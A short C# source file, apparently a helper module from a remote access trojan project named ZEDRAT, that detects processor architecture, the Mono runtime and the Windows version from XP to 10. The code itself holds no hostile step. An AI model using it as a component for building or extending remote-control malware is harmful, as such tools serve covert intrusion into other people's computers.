using System;

namespace ZEDRatApp.ZEDRAT.Helper
{
	public static class PlatformHelper
	{
		public static int Architecture => IntPtr.Size * 8;

		public static bool RunningOnMono { get; private set; }

		public static bool Win32NT { get; private set; }

		public static bool XpOrHigher { get; private set; }

		public static bool VistaOrHigher { get; private set; }

		public static bool SevenOrHigher { get; private set; }

		public static bool EightOrHigher { get; private set; }

		public static bool EightPointOneOrHigher { get; private set; }

		public static bool TenOrHigher { get; private set; }

		static PlatformHelper()
		{
			PlatformHelper.Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
			PlatformHelper.XpOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version.Major >= 5;
			PlatformHelper.VistaOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version.Major >= 6;
			PlatformHelper.SevenOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(6, 1);
			PlatformHelper.EightOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(6, 2, 9200);
			PlatformHelper.EightPointOneOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(6, 3);
			PlatformHelper.TenOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(10, 0);
			PlatformHelper.RunningOnMono = Type.GetType("Mono.Runtime") != null;
		}
	}
}
